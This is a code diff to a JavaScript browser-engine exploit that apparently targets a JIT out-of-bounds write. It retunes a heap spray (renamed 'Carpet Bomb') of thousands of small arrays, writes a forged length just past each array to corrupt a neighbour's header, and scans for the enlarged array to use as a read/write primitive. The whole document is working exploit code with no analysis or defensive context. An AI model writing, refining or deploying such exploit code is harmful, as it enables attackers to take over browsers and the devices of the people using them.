@@ -145,6 +145,8 @@
 
         // Tag arrays
         for (let i = 0; i < global_arrays.length; i++) {
+             // Tag oob_slave (object array)
+             // 0x41414141 marker in high bits
              let marker = i2f(i, 0x41414141);
              global_arrays[i].o[0] = f64_buf[0]; 
         }
@@ -153,7 +155,7 @@
         
         // Scan limit based on master size
         let scan_limit = oob_master.length; 
-        if(scan_limit > 0x200000) scan_limit = 0x200000; // Cap to avoid freeze
+        if(scan_limit > 0x100000) scan_limit = 0x100000; 
 
         for (let i = 0; i < scan_limit; i++) {
             let val = f2i(oob_master[i]);
@@ -215,11 +217,11 @@
     }
 
     // ==========================================
-    // === TRIGGER LOGIC (GIANT TARGETS) ===
+    // === TRIGGER LOGIC (CARPET BOMB) ===
     // ==========================================
 
     const CONFIG = {
-        SPRAY_SIZE: 0x400,       
+        SPRAY_SIZE: 0x200,       
         SPRAY_CHUNK_SIZE: 0x4000
     };
 
@@ -244,15 +246,15 @@
     }
 
     function triggerOOB() {
-        logger.info("Triggering OOB (Giant Target Strategy)...");
+        logger.info("Triggering OOB (Carpet Bomb Strategy)...");
         global_arrays = []; 
         
-        // ALLOCATION STRATEGY: 
-        // Use MASSIVE arrays (0x1000 items) to align to page boundaries.
-        // Less arrays (512), but much bigger targets.
-        for (let i = 0; i < 512; i++) { 
-            let dbl_arr = new Array(0x1000).fill(1.1); // 4096 doubles (~32KB)
-            let obj_arr = [{}, {}, {}, {}, {}, {}, {}, {}, {}, {}];
+        // ALLOCATION STRATEGY: Compact & Massive
+        // 32-length arrays fit nicely in small IsoSubspace blocks
+        // We create 0x4000 (16384) of them to fill the heap densely
+        for (let i = 0; i < 0x4000; i++) { 
+            let dbl_arr = new Array(32).fill(1.1);
+            let obj_arr = [{}, {}, {}, {}, {}, {}, {}, {}, {}, {}]; // keep obj small
             global_arrays.push({ d: dbl_arr, o: obj_arr });
         }
 
@@ -262,31 +264,36 @@
             return tmp;
         }
 
-        // Re-Train JIT inside the function to ensure hot code
+        // Train JIT
         for (let i = 0; i < 10000; i++) vulnerable_jit(global_arrays[0].d, 0, 1.1);
 
-        logger.warn("Scanning Giant Arrays...");
+        logger.warn("Carpet Bombing arrays 1000-8000...");
         
         try {
             let magic_len = i2f(0x13370, 0x00000000); 
 
-            // Scan a stable middle range
-            for (let idx = 200; idx < 300; idx++) {
+            // STRATEGY: 
+            // Iterate through thousands of arrays.
+            // For EACH array, write just past its end.
+            // We use strides to avoid CPU hang.
+            
+            for (let idx = 1000; idx < 8000; idx++) {
                 let target_array = global_arrays[idx].d;
                 
-                if (idx % 20 === 0) logger.info(`Scanning chunk ${idx}...`);
+                // Only log every 500 so UI doesn't freeze
+                if (idx % 1000 === 0) logger.info(`Bombing chunk ${idx}...`);
 
-                // Since arrays are 0x1000 long, the next header is roughly at 0x1000 + headers.
-                // We write near the end of the array to overflow into the next one.
-                // We scan from index 4090 to 4200 (crossing the boundary).
-                for (let offset = 4090; offset < 4200; offset++) {
+                // Arrays are length 32. 
+                // We scan offsets 32 to 64 (Immediate neighbor range).
+                // If aligned, neighbor header is likely at +32, +40, or +48.
+                for (let offset = 32; offset < 64; offset++) {
                     vulnerable_jit(target_array, offset, magic_len);
                 }
             }
 
-            // Check
+            // After the bombing run, check for survivors (corrupted arrays)
             for (let i = 0; i < global_arrays.length; i++) {
-                if (global_arrays[i].d.length > 0x2000) { // Check for extended length
+                if (global_arrays[i].d.length > 50) { // Check for extended length
                     logger.success(`SUCCESS! Found massive array at index ${i}`);
                     oob_master = global_arrays[i].d;
                     return true;
